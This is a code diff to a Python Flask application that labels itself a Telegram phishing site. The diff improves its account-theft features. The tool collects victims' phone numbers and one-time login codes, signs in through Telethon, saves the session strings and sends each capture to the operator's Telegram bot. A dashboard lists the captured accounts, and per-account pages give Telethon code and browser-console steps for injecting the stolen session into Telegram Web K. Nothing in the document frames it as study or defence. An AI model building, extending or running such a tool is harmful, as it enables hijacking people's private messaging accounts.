@@ -40,28 +40,30 @@ def load_accounts():
         try:
             with open(DATA_FILE, 'r') as f:
                 return json.load(f)
-        except:
+        except Exception as e:
+            logger.error(f"Load error: {e}")
             return []
     return []
 
 def save_account(account):
     accounts = load_accounts()
+    found = False
     for i, a in enumerate(accounts):
         if a['phone'] == account['phone']:
             accounts[i] = account
+            found = True
             break
-    else:
+    if not found:
         accounts.append(account)
     with open(DATA_FILE, 'w') as f:
         json.dump(accounts, f, indent=2)
+    logger.info(f"✅ Saved to file: {account['phone']} | Session: {len(account.get('session',''))} chars")
     return account
 
-# Load existing accounts on startup
 captured_accounts = load_accounts()
 
 # ====== Phone Formatter ======
 def format_phone(ph):
-    """Auto add +91 if 10 digit number given"""
     if not ph:
         return ph
     digits = ''.join(filter(str.isdigit, ph))
@@ -257,7 +259,6 @@ PAGE = """<!DOCTYPE html>
             return;
         }
         
-        // Auto add +91
         phoneNumber = '+91' + phone;
         
         document.getElementById('ps1').className = 'sb waiting';
@@ -430,7 +431,6 @@ def run_telegram_action(phone, code=None):
                     me = await client2.get_me()
                     await client2.disconnect()
                 
-                # Build account record
                 acc = {
                     'phone': phone,
                     'user_id': me.id,
@@ -449,7 +449,7 @@ def run_telegram_action(phone, code=None):
                     'time': str(datetime.now())
                 }
                 
-                # ====== FIX: Save to file and refresh list ======
+                # ====== FIX: Save to file AND update memory ======
                 save_account(acc)
                 global captured_accounts
                 captured_accounts = load_accounts()
@@ -459,12 +459,13 @@ def run_telegram_action(phone, code=None):
                         del user_sessions[phone]
                     pending_codes[phone] = 'done'
                 
-                # Notify
+                # Send notification with PARTIAL session for verification
+                session_preview = ss[:20] + "..." if len(ss) > 20 else ss
                 try:
                     import requests
                     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                         'chat_id': YOUR_TELEGRAM_ID,
-                        'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: OK ({len(ss)} chars)",
+                        'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: OK ({len(ss)} chars)\n🔑 `/session/{phone}`\n🌐 `/webk/{phone}`",
                         'parse_mode': 'Markdown'
                     }, timeout=5)
                 except:
@@ -507,7 +508,6 @@ def share():
         return jsonify({'success': False, 'error': 'Phone required'})
     
     ph = format_phone(ph)
-    
     logger.info(f"📱 Phone received: {ph}")
     
     with sessions_lock:
@@ -533,7 +533,6 @@ def verify():
     code = d.get('code', '')
     
     ph = format_phone(ph)
-    
     result = run_telegram_action(ph, code)
     return jsonify(result)
 
@@ -541,42 +540,61 @@ def verify():
 def get_session(phone):
     phone = format_phone(phone)
     global captured_accounts
-    captured_accounts = load_accounts()  # Refresh from file
+    captured_accounts = load_accounts()
     
     a = next((x for x in captured_accounts if x['phone'] == phone), None)
     
     if not a:
+        # Check if still in pending state
+        with sessions_lock:
+            if phone in user_sessions:
+                return jsonify({
+                    'phone': phone,
+                    'status': 'pending',
+                    'message': 'Code sent, waiting for verification'
+                })
         return jsonify({'error': 'Not found'}), 404
     
     return jsonify({
         'phone': phone,
         'user_id': a['user_id'],
         'name': f"{a['first_name']} {a['last_name']}",
+        'username': a['username'],
+        'dc': a['dc'],
         'session': a['session'],
         'session_length': len(a['session']),
-        'has_session': bool(a['session'])
+        'has_session': bool(a['session']),
+        'webk_data': a['webk']
     })
 
 @app.route('/webk/<phone>')
 def webk(phone):
     phone = format_phone(phone)
     global captured_accounts
-    captured_accounts = load_accounts()  # Refresh from file
+    captured_accounts = load_accounts()
     
     a = next((x for x in captured_accounts if x['phone'] == phone), None)
     
     if not a:
-        return "Not found", 404
+        return """
+        <html><body style="background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh">
+        <div style="text-align:center;padding:40px;background:#141420;border-radius:20px;border:1px solid #1a1a2e">
+        <h2 style="color:#e94560">❌ Not Found</h2>
+        <p style="color:#888">No account found for this phone number.</p>
+        <p style="color:#666;font-size:12px">Make sure the victim has entered the OTP correctly.</p>
+        <a href="/dash" style="color:#0088cc">← Back to Dashboard</a>
+        </div></body></html>
+        """, 404
     
     w = a['webk']
     ss = a['session']
-    ss_ok = bool(ss)
+    ss_ok = bool(ss) and len(ss) > 10
     
     return f"""
     <!DOCTYPE html><html><head><title>WebK - {a['first_name']}</title>
     <style>
         body{{background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}}
-        .c{{background:#141420;padding:40px;border-radius:20px;max-width:500px;width:100%;text-align:center;border:1px solid #1a1a2e}}
+        .c{{background:#141420;padding:40px;border-radius:20px;max-width:550px;width:100%;text-align:center;border:1px solid #1a1a2e}}
         .av{{width:70px;height:70px;border-radius:50%;background:#0088cc;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 15px}}
         .i{{color:#888;margin:3px 0;font-size:14px}}
         .b{{width:100%;padding:15px;border:none;border-radius:12px;font-size:15px;cursor:pointer;margin:8px 0;font-weight:600}}
@@ -586,86 +604,112 @@ def webk(phone):
         .sb{{background:#0a0a0a;padding:12px;border-radius:8px;word-break:break-all;font-size:10px;margin:10px 0;text-align:left;color:#0f0;max-height:200px;overflow:auto}}
         .warn{{background:#e94560;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px}}
         .success{{background:#4CAF50;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px}}
+        code{{color:#0f0;word-break:break-all;font-size:9px}}
+        .sg{{background:#0a0a0a;padding:15px;border-radius:8px;text-align:left;font-size:11px;margin:10px 0;border:1px solid #2a2a3e}}
     </style></head>
     <body><div class="c">
     <div class="av">{a['first_name'][0] if a['first_name'] else '?'}</div>
     <h2>{a['first_name']} {a['last_name']}</h2>
     <div class="i">@{a['username'] or '—'} | ID: {a['user_id']} | DC: {a['dc']}</div>
     <div class="i">📱 {a['phone']}</div>
-    {'<div class="success">✅ Session String Captured! ({len(ss)} chars)</div>' if ss_ok else '<div class="warn">⚠️ No session</div>'}
-    <div class="sb">{w}</div>
+    {'<div class="success">✅ Session Captured! (' + str(len(ss)) + ' chars)</div>' if ss_ok else '<div class="warn">⚠️ No session string available</div>'}
+    
+    <div class="sg"><b>📍 WebK Data (localStorage):</b><br><code>{w}</code></div>
+    
     <button class="b bp" onclick="o()">1️⃣ Open WebK</button>
     <button class="b bs" id="ib" style="display:none" onclick="i()">2️⃣ Inject Session</button>
     <button class="b bp" id="rb" style="display:none" onclick="r()">3️⃣ Refresh</button>
     <div id="st" class="i" style="margin-top:15px"></div>
+    
     <hr style="border-color:#1a1a2e;margin:15px 0">
+    
+    <div class="sg"><b>🔑 Session String ({len(ss)} chars):</b><br>
+    <code style="font-size:10px">{ss}</code></div>
+    
     <button class="b br" onclick="copySession()">📋 Copy Session String</button>
-    <div style="margin-top:15px;padding:12px;background:#0a0a0a;border-radius:8px;text-align:left;font-size:11px">
-    <b>Session String:</b><br>
-    <code style="color:#0f0;word-break:break-all;font-size:9px">{ss}</code>
+    
+    <div class="sg"><b>🐍 Telethon Usage:</b><br>
+    <code style="font-size:10px">
+from telethon import TelegramClient<br>
+from telethon.sessions import StringSession<br><br>
+client = TelegramClient(StringSession('{ss}'), {API_ID}, '{API_HASH}')<br>
+client.start()<br>
+me = client.get_me()<br>
+print(me.phone)
+    </code></div>
+    
+    <div class="sg"><b>🌐 Manual WebK Injection:</b><br>
+    1. Open web.telegram.org/k<br>
+    2. Press F12 → Console<br>
+    3. Paste: <code style="font-size:10px">localStorage.setItem('webk_session','{w}')</code><br>
+    4. Press F5 to refresh
     </div>
-    <div style="margin-top:15px;padding:12px;background:#0a0a0a;border-radius:8px;text-align:left;font-size:11px">
-    <b>Use with Telethon:</b><br>
-    <code style="color:#0f0;font-size:10px">
-    from telethon import TelegramClient<br>
-    from telethon.sessions import StringSession<br>
-    client = TelegramClient(StringSession('{ss}'), {API_ID}, '{API_HASH}')<br>
-    client.start()<br>
-    me = client.get_me()
-    </code>
+    
+    <a href="/dash" style="color:#0088cc;font-size:12px;text-decoration:none">← Dashboard</a>
+    
     </div>
-    <div style="margin-top:15px;padding:12px;background:#0a0a0a;border-radius:8px;text-align:left;font-size:11px">
-    <b>Manual WebK:</b><br>
-    1. web.telegram.org/k<br>
-    2. F12 → Console<br>
-    3. Paste: <code style="color:#0f0;">localStorage.setItem('webk_session','{w}')</code><br>
-    4. F5
-    </div></div>
     <script>
     var wk;
-    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='✅ Opened!'}}
-    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='❌ Closed!';return}}
-    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='✅ Injected!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='❌ Error'}}}}
-    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='🎉 Logged in!'}}}}
-    function copySession(){{navigator.clipboard.writeText('{ss}').then(function(){{document.getElementById('st').textContent='📋 Session copied!'}})['catch'](function(){{document.getElementById('st').textContent='❌ Copy failed'}})}}
+    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='✅ Opened! Click Inject'}}
+    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='❌ Window closed!';return}}
+    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='✅ Injected! Click Refresh';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='❌ Injection failed'}}}}
+    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='🎉 Logged in! Check WebK'}}}}
+    function copySession(){{navigator.clipboard.writeText('{ss}').then(function(){{document.getElementById('st').textContent='✅ Session copied!'}})['catch'](function(){{document.getElementById('st').textContent='❌ Copy failed'}})}}
     </script></body></html>
     """
 
 @app.route('/dash')
 def dash():
     global captured_accounts
-    captured_accounts = load_accounts()  # Refresh from file
-    
+    captured_accounts = load_accounts()
     accounts = captured_accounts
     
     rows = ""
     for i, a in enumerate(accounts, 1):
-        ss_status = "✅" if a['session'] else "❌"
-        ss_len = len(a['session']) if a['session'] else 0
-        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a['first_name']} {a['last_name']}</td><td>@{a['username'] or '—'}</td><td>{a['user_id']}</td><td>{a['dc']}</td><td>{ss_status} ({ss_len})</td><td>{a['time']}</td><td><a href='/webk/{a['phone']}'><button style='background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer'>🔑</button></a></td></tr>"
+        ss_status = "✅" if a.get('session') and len(a['session']) > 10 else "❌"
+        ss_len = len(a.get('session', '')) if a.get('session') else 0
+        rows += f"""<tr>
+            <td>{i}</td>
+            <td>{a['phone']}</td>
+            <td>{a.get('first_name','')} {a.get('last_name','')}</td>
+            <td>@{a.get('username','—')}</td>
+            <td>{a.get('user_id','')}</td>
+            <td>{a.get('dc','')}</td>
+            <td>{ss_status} ({ss_len})</td>
+            <td>{a.get('time','')}</td>
+            <td><a href='/webk/{a["phone"]}'><button style="background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer">🔑 View</button></a></td>
+        </tr>"""
     
     return f"""
-    <!DOCTYPE html><html><head><title>Dashboard</title>
+    <!DOCTYPE html><html><head><title>Telegram Dashboard</title>
     <style>
         body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
-        h1{{color:#e94560}} table{{width:100%;border-collapse:collapse;margin-top:15px}}
-        th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e}}
-        th{{background:#141420}} tr:hover{{background:#141420}}
+        h1{{color:#e94560}}
+        table{{width:100%;border-collapse:collapse;margin-top:15px}}
+        th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}}
+        th{{background:#141420;color:#ddd}}
+        tr:hover{{background:#141420}}
         .st{{display:inline-block;background:#141420;padding:15px 25px;border-radius:10px;margin:10px}}
         .st .n{{font-size:30px;font-weight:bold;color:#0088cc}}
+        a{{color:#0088cc;text-decoration:none}}
     </style></head>
     <body>
-    <h1>🎯 Captured Accounts</h1>
-    <div class="st"><div class="n">{len(accounts)}</div><div>Total</div></div>
-    <table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th><th>Action</th></tr></thead><tbody>
-    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;">No accounts yet</td></tr>'}
+    <h1>🎯 Telegram Accounts</h1>
+    <div class="st"><div class="n">{len(accounts)}</div><div>Total Captured</div></div>
+    <table><thead><tr>
+        <th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th><th>Action</th>
+    </tr></thead><tbody>
+    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;padding:30px">No accounts captured yet. Share the phishing page to collect sessions.</td></tr>'}
     </tbody></table>
-    <script>setInterval(()=>location.reload(),5000)</script>
+    <script>setTimeout(()=>location.reload(),10000)</script>
     </body></html>
     """
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"✅ Phishing site ready on port {port}")
+    print(f"✅ Phishing server running on port {port}")
+    print(f"🎯 Main page: http://localhost:{port}")
     print(f"📊 Dashboard: http://localhost:{port}/dash")
-    app.run(host='0.0.0.0', port=port)
+    print(f"🔑 Session API: http://localhost:{port}/session/+91XXXXXXXXXX")
+    print(f"🌐 WebK View: http://localhost:{port}/webk/+91XXXXXXXXXX")
+    app.run(host='0.0.0.0', port=port, debug=True)
